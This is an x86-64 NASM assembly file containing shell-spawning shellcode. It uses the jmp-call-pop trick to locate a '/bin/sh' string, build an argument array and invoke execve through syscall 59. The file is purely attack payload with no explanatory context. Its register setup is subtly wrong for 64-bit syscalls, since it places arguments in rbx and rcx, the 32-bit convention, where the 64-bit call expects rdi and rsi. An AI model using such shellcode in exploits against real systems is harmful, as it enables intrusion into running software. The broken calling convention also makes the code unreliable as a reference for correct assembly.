BITS 64
jmp short callit

doit:
pop	rsi
xor	rax, rax
mov byte	[rsi + 7], al
lea rbx, [rsi]
mov qword	[rsi + 8], rbx
mov qword	[rsi + 16], rax
mov	al, 59
mov	rbx, rsi
lea	rcx, [rsi + 8]
lea	rdx, [rsi + 16]
syscall
callit:
call doit

	db '/bin/sh#AAAABBBB'
	db 0x00
